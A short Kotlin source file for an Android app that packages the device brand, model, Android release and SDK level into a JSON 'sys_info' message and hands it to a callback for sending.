package com.app.cyber

import android.content.Context
import android.os.Build
import org.json.JSONObject

object SysInfoRechive {
    fun getInfo(ctx: Context, emit: (JSONObject) -> Unit) {
        val payload = JSONObject()
        payload.put("action", "sys_info")
        
        val data = JSONObject()
        data.put("brand", Build.BRAND)
        data.put("model", Build.MODEL)
        data.put("android", Build.VERSION.RELEASE)
        data.put("sdk", Build.VERSION.SDK_INT)
        
        payload.put("data", data)
        emit(payload)
    }
}
